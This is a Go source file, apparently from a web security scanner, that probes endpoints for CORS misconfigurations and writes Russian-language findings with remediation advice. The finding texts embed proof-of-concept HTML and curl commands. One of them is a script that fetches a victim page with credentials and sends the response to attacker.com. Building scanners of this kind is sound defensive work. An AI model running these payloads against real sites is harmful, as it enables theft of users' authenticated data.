package checks

import (
	"fmt"
	"strings"

	"vectrixgo/internal/crawler"
	"vectrixgo/internal/findings"
	"vectrixgo/internal/httpsession"
	"vectrixgo/internal/logging"
)

type originProbe struct {
	origin string
	label  string
}

var originProbes = []originProbe{
	{"https://evil.example.com", "arbitrary external origin"},
	{"null", "null origin"},
	{"https://trusted-domain.evil.com", "subdomain of trusted (if reflected by prefix)"},
}

// RunCORS probes base_url and every GET endpoint with a set of attacker-controlled
// Origin headers, looking for wildcard/reflection misconfigurations. Mirrors
// modules/checks/cors.py run().
func RunCORS(session *httpsession.Session, baseURL string, endpoints []crawler.Endpoint, store *findings.FindingStore) {
	logging.Println("[*] Checking CORS configuration...")
	curlAuth := session.CurlAuthFlags(baseURL)

	tested := make(map[string]struct{})
	targets := []string{baseURL}
	for _, ep := range endpoints {
		if ep.Method == "GET" {
			targets = append(targets, ep.URL)
		}
	}

	for _, url := range targets {
		if _, ok := tested[url]; ok {
			continue
		}
		tested[url] = struct{}{}
		testCORS(session, url, curlAuth, store)
	}
}

func testCORS(session *httpsession.Session, url, curlAuth string, store *findings.FindingStore) {
	for _, probe := range originProbes {
		resp, err := session.Get(url, map[string]string{"Origin": probe.origin})
		if err != nil {
			continue
		}

		acao := resp.Header.Get("Access-Control-Allow-Origin")
		acac := strings.ToLower(resp.Header.Get("Access-Control-Allow-Credentials"))
		acam := resp.Header.Get("Access-Control-Allow-Methods")

		if acao == "" {
			continue
		}

		switch {
		case acao == "*" && acac == "true":
			f := findings.NewFinding(
				"CORS: критическая — wildcard с Allow-Credentials",
				findings.Critical,
				"CORS",
				"CWE-942",
				url,
				"Сервер возвращает одновременно Access-Control-Allow-Origin: * "+
					"и Access-Control-Allow-Credentials: true. "+
					"По спецификации это не должно работать, но некоторые браузеры/прокси нарушают стандарт.",
				"Никогда не используйте * с credentials. "+
					"Разрешайте только конкретные домены из белого списка.",
				fmt.Sprintf("curl -sk %s -H 'Origin: %s' -I '%s' | grep -i access-control", curlAuth, probe.origin, url),
			)
			f.Evidence = fmt.Sprintf("ACAO: %s\nACAC: %s", acao, acac)
			store.Add(f)

		case acao == "*":
			f := findings.NewFinding(
				fmt.Sprintf("CORS: wildcard Access-Control-Allow-Origin (%s)", probe.label),
				findings.Low,
				"CORS",
				"CWE-942",
				url,
				"Сервер возвращает Access-Control-Allow-Origin: *. "+
					"Любой сайт может читать ответ через XMLHttpRequest/fetch. "+
					"Критично для API с чувствительными данными.",
				"Ограничьте CORS конкретными доменами. Уберите * для authenticated endpoints.",
				fmt.Sprintf("curl -sk %s -H 'Origin: %s' -I '%s' | grep -i access-control", curlAuth, probe.origin, url),
			)
			f.Evidence = fmt.Sprintf("ACAO: %s", acao)
			store.Add(f)

		case strings.Contains(acao, probe.origin) && acac == "true":
			f := findings.NewFinding(
				fmt.Sprintf("CORS: отражение Origin с Allow-Credentials — %s", probe.label),
				findings.High,
				"CORS",
				"CWE-942",
				url,
				fmt.Sprintf("Сервер отражает Origin '%s' в ACAO "+
					"и устанавливает Allow-Credentials: true.\n"+
					"Атакующий может совершать аутентифицированные cross-origin запросы от имени жертвы.\n\n"+
					"PoC:\n"+
					"```html\n"+
					"<script>\n"+
					"fetch('%s', {credentials: 'include'})\n"+
					"  .then(r => r.text())\n"+
					"  .then(d => fetch('https://attacker.com/?leak='+btoa(d)))\n"+
					"</script>\n"+
					"```", probe.origin, url),
				"1. Проверяйте Origin по жёсткому белому списку (не по prefix/suffix).\n"+
					"2. Не используйте динамическое отражение Origin.\n"+
					"3. Если API публичное — уберите Allow-Credentials.",
				fmt.Sprintf("# Step 1: убедиться что Origin отражается:\n"+
					"curl -sk %s -H 'Origin: %s' -I '%s'\n\n"+
					"# Step 2: PoC HTML (разместить на подконтрольном домене):\n"+
					"cat > /tmp/cors_poc.html << 'EOF'\n"+
					"<script>\n"+
					"fetch('%s', {credentials:'include'})\n"+
					"  .then(r=>r.text()).then(d=>console.log(d));\n"+
					"</script>\n"+
					"EOF\n"+
					"python3 -m http.server 8888 --directory /tmp", curlAuth, probe.origin, url, url),
			)
			f.Evidence = fmt.Sprintf("Request Origin: %s\nACAO: %s\nACAC: %s\nACAM: %s", probe.origin, acao, acac, acam)
			store.Add(f)

		case strings.Contains(acao, probe.origin):
			f := findings.NewFinding(
				fmt.Sprintf("CORS: отражение произвольного Origin — %s", probe.label),
				findings.Medium,
				"CORS",
				"CWE-942",
				url,
				fmt.Sprintf("Сервер отражает Origin '%s' в ACAO без ограничений.\n"+
					"Без Allow-Credentials данные доступны только публичные, "+
					"но это может стать проблемой при утечке токенов в URL или ответах.", probe.origin),
				"Используйте белый список Origins вместо динамического отражения.",
				fmt.Sprintf("curl -sk %s -H 'Origin: %s' -I '%s'", curlAuth, probe.origin, url),
			)
			f.Evidence = fmt.Sprintf("Request Origin: %s\nACAO: %s", probe.origin, acao)
			store.Add(f)

		case probe.origin == "null" && strings.Contains(acao, "null"):
			f := findings.NewFinding(
				"CORS: разрешён null Origin",
				findings.High,
				"CORS",
				"CWE-942",
				url,
				"Сервер принимает Origin: null. null origin получают: file://, "+
					"data: URI, sandboxed iframes — атакующий может запустить XHR из таких контекстов.",
				"Удалите 'null' из списка разрешённых Origins.",
				fmt.Sprintf("# PoC: HTML-файл с sandboxed iframe (даёт Origin: null)\n"+
					"cat > /tmp/null_cors.html << 'EOF'\n"+
					"<iframe sandbox=\"allow-scripts\" src=\"data:text/html,"+
					"<script>fetch('%s',{credentials:'include'})"+
					".then(r=>r.text()).then(d=>console.log(d))</script>\"></iframe>\n"+
					"EOF\n"+
					"python3 -m http.server 8888 --directory /tmp", url),
			)
			f.Evidence = fmt.Sprintf("ACAO: %s", acao)
			store.Add(f)
		}
	}
}
